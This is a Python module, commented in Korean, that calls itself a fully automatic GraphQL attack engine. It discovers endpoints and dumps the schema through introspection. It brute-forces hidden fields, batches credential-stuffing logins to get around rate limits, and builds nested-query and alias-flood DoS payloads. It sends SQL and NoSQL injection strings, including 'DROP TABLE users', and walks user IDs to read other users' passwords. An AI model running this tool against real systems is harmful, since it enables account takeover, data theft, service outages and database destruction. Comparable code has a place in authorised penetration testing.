"""bingo/tools/graphql_advanced.py — GraphQL 완전 자동 공격 엔진 (v2.9.0)

기능:
  - 인트로스펙션으로 전체 스키마 덤프
  - 숨겨진 뮤테이션 / 관리자 쿼리 탐지
  - 배치 공격으로 rate limit 우회
  - 필드 브루트포싱
  - IDOR / 권한 우회 테스트
  - SQL/NoSQL 인젝션 via GraphQL
  - 중첩 쿼리 DoS 테스트
"""
from __future__ import annotations

import json
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class GraphqlFinding:
    url: str
    finding_type: str    # "introspection" | "hidden_mutation" | "idor" | "injection" | "auth_bypass"
    description: str
    payload: str = ""
    response_snippet: str = ""
    severity: str = "HIGH"


@dataclass
class GraphqlReport:
    target: str
    schema: dict = field(default_factory=dict)
    findings: list[GraphqlFinding] = field(default_factory=list)
    mutations: list[str] = field(default_factory=list)
    queries: list[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [
            f"[GRAPHQL] {self.target}",
            f"  쿼리: {len(self.queries)}개 | 뮤테이션: {len(self.mutations)}개 | 발견: {len(self.findings)}개",
        ]
        for f in self.findings:
            lines.append(f"  [{f.finding_type:20}] {f.description[:60]}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 인트로스펙션
# ══════════════════════════════════════════════════════════════════════════════

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name ofType { kind name ofType { kind name ofType { kind name } } }
}
"""


class GraphqlIntrospector:
    """GraphQL 스키마 완전 덤프"""

    @staticmethod
    def introspect(gql_url: str, request_fn: Callable) -> dict:
        payload = json.dumps({"query": INTROSPECTION_QUERY})
        headers = {"Content-Type": "application/json"}
        _, body = request_fn(gql_url, "POST", headers, payload)
        try:
            data = json.loads(body)
            return data.get("data", {}).get("__schema", {})
        except Exception:
            return {}

    @staticmethod
    def extract_operations(schema: dict) -> tuple[list[str], list[str]]:
        """쿼리/뮤테이션 이름 목록 추출"""
        queries, mutations = [], []
        for t in schema.get("types", []):
            if t.get("kind") == "OBJECT" and t.get("name") not in ("Query", "Mutation", "__Schema"):
                pass
            if t.get("name") == "Query" and t.get("fields"):
                queries = [f["name"] for f in t["fields"]]
            if t.get("name") == "Mutation" and t.get("fields"):
                mutations = [f["name"] for f in t["fields"]]
        return queries, mutations

    @staticmethod
    def find_sensitive_operations(mutations: list[str], queries: list[str]) -> list[str]:
        """위험한 뮤테이션/쿼리 탐지"""
        sensitive_keywords = [
            "admin", "delete", "drop", "reset", "create", "update", "modify",
            "user", "role", "permission", "privilege", "password", "token",
            "secret", "key", "export", "import", "backup", "restore", "debug",
            "system", "config", "setting",
        ]
        found = []
        for op in mutations + queries:
            if any(kw in op.lower() for kw in sensitive_keywords):
                found.append(op)
        return found


# ══════════════════════════════════════════════════════════════════════════════
# 필드 브루트포싱
# ══════════════════════════════════════════════════════════════════════════════

class GraphqlFieldBruter:
    """숨겨진 필드/타입 브루트포싱"""

    COMMON_FIELDS = [
        "id", "user", "admin", "email", "password", "token", "secret",
        "role", "permission", "isAdmin", "is_admin", "adminFlag",
        "hidden", "internal", "debug", "metadata", "config", "setting",
        "privateKey", "apiKey", "sessionToken", "authToken",
        "created_at", "updated_at", "deleted_at", "deletedAt",
        "username", "userId", "customerId", "accountId",
    ]

    @staticmethod
    def probe_field(gql_url: str, type_name: str, field_name: str, request_fn: Callable) -> bool:
        query = f"{{ {type_name} {{ {field_name} }} }}"
        payload = json.dumps({"query": query})
        headers = {"Content-Type": "application/json"}
        _, body = request_fn(gql_url, "POST", headers, payload)
        data = {}
        try:
            data = json.loads(body)
        except Exception:
            pass
        # 에러 없이 응답이 오면 필드 존재
        errors = data.get("errors", [])
        if not errors:
            return True
        for err in errors:
            msg = err.get("message", "").lower()
            if "cannot query field" in msg or "unknown field" in msg:
                return False
        return True


# ══════════════════════════════════════════════════════════════════════════════
# 배치 공격 (rate limit 우회)
# ══════════════════════════════════════════════════════════════════════════════

class GraphqlBatchAttacker:
    """배치 쿼리로 rate limit 우회 + 대량 작업"""

    @staticmethod
    def batch_login(gql_url: str, mutation_name: str, credentials: list[tuple[str, str]], request_fn: Callable) -> list[dict]:
        """대량 로그인 시도 (한 번의 요청으로)"""
        batch = []
        for i, (user, pwd) in enumerate(credentials):
            batch.append({
                "query": f'mutation {{ {mutation_name}(username: "{user}", password: "{pwd}") {{ token success }} }}',
                "operationName": f"login_{i}",
            })
        payload = json.dumps(batch)
        headers = {"Content-Type": "application/json"}
        _, body = request_fn(gql_url, "POST", headers, payload)
        try:
            return json.loads(body)
        except Exception:
            return []

    @staticmethod
    def nested_dos_query(depth: int = 10) -> str:
        """중첩 쿼리 DoS 테스트"""
        q = "{ user { friends"
        close = "} } " * depth
        return q + " { friends" * (depth - 2) + close

    @staticmethod
    def alias_flood(field: str, count: int = 100) -> str:
        """alias 기반 대량 요청"""
        aliases = "\n".join(f"f{i}: {field}" for i in range(count))
        return f"{{ {aliases} }}"


# ══════════════════════════════════════════════════════════════════════════════
# GraphQL 인젝션
# ══════════════════════════════════════════════════════════════════════════════

class GraphqlInjection:
    """GraphQL 파라미터를 통한 인젝션 테스트"""

    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--",
        "' OR 1=1--",
    ]

    NOSQL_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$regex": ".*"}',
    ]

    @staticmethod
    def inject_field(gql_url: str, query_name: str, param: str, payload: str, request_fn: Callable) -> tuple[int, str]:
        query = f'{{ {query_name}({param}: "{payload}") {{ id username email }} }}'
        body = json.dumps({"query": query})
        headers = {"Content-Type": "application/json"}
        return request_fn(gql_url, "POST", headers, body)


# ══════════════════════════════════════════════════════════════════════════════
# GraphQL IDOR
# ══════════════════════════════════════════════════════════════════════════════

class GraphqlIdor:
    """GraphQL IDOR — 다른 사용자의 데이터 접근"""

    @staticmethod
    def probe_user_idor(gql_url: str, query_name: str, id_range: range, request_fn: Callable) -> list[dict]:
        """ID 순회로 타 사용자 데이터 접근 시도"""
        found = []
        for uid in id_range:
            query = f'{{ {query_name}(id: "{uid}") {{ id username email role password }} }}'
            body = json.dumps({"query": query})
            headers = {"Content-Type": "application/json"}
            _, resp_body = request_fn(gql_url, "POST", headers, body)
            try:
                data = json.loads(resp_body)
                if data.get("data") and data["data"].get(query_name):
                    found.append({"id": uid, "data": data["data"][query_name]})
            except Exception:
                pass
        return found


# ══════════════════════════════════════════════════════════════════════════════
# 메인 GraphQL 고급 엔진
# ══════════════════════════════════════════════════════════════════════════════

class GraphqlAdvancedEngine:
    """GraphQL 완전 자동 공격 엔진"""

    GRAPHQL_PATHS = [
        "/graphql", "/api/graphql", "/v1/graphql", "/gql",
        "/graphiql", "/playground", "/api/gql",
    ]

    def __init__(self, request_fn: Callable[[str, str, dict, str], tuple[int, str]]) -> None:
        self.req = request_fn

    def find_endpoint(self, base_url: str) -> str | None:
        domain = re.match(r"(https?://[^/]+)", base_url)
        if not domain:
            return None
        base = domain.group(1)
        for path in self.GRAPHQL_PATHS:
            url = base + path
            # 인트로스펙션 시도
            payload = json.dumps({"query": "{ __typename }"})
            headers = {"Content-Type": "application/json"}
            status, body = self.req(url, "POST", headers, payload)
            if status == 200 and "__typename" in body:
                return url
        return None

    def full_attack(self, gql_url: str) -> GraphqlReport:
        report = GraphqlReport(target=gql_url)

        # 1. 인트로스펙션
        schema = GraphqlIntrospector.introspect(gql_url, self.req)
        report.schema = schema
        if schema:
            report.findings.append(GraphqlFinding(
                url=gql_url, finding_type="introspection",
                description="인트로스펙션 활성화 — 전체 스키마 노출",
                severity="MEDIUM",
            ))
            queries, mutations = GraphqlIntrospector.extract_operations(schema)
            report.queries = queries
            report.mutations = mutations
            # 위험 뮤테이션 탐지
            dangerous = GraphqlIntrospector.find_sensitive_operations(mutations, queries)
            for op in dangerous:
                report.findings.append(GraphqlFinding(
                    url=gql_url, finding_type="hidden_mutation",
                    description=f"위험 오퍼레이션: {op}",
                    severity="HIGH",
                ))

        # 2. 배치 공격 (rate limit 우회)
        dos_query = GraphqlBatchAttacker.nested_dos_query(depth=8)
        payload = json.dumps({"query": dos_query})
        status, body = self.req(gql_url, "POST", {"Content-Type": "application/json"}, payload)
        if status == 200:
            report.findings.append(GraphqlFinding(
                url=gql_url, finding_type="dos_nested",
                description="중첩 쿼리 DoS — 깊이 제한 없음",
                payload=dos_query[:100],
                severity="MEDIUM",
            ))

        # 3. SQL 인젝션 시도
        if report.queries:
            for sqli_payload in GraphqlInjection.SQL_PAYLOADS[:2]:
                status, body = GraphqlInjection.inject_field(
                    gql_url, report.queries[0], "id", sqli_payload, self.req
                )
                if any(e in body.lower() for e in ["sql", "syntax", "mysql", "postgresql", "sqlite"]):
                    report.findings.append(GraphqlFinding(
                        url=gql_url, finding_type="injection",
                        description=f"GraphQL SQL 인젝션 — {report.queries[0]}",
                        payload=sqli_payload,
                        response_snippet=body[:200],
                        severity="CRITICAL",
                    ))

        return report

    def auto_scan(self, base_url: str) -> GraphqlReport:
        gql_url = self.find_endpoint(base_url)
        if not gql_url:
            return GraphqlReport(target=base_url)
        return self.full_attack(gql_url)
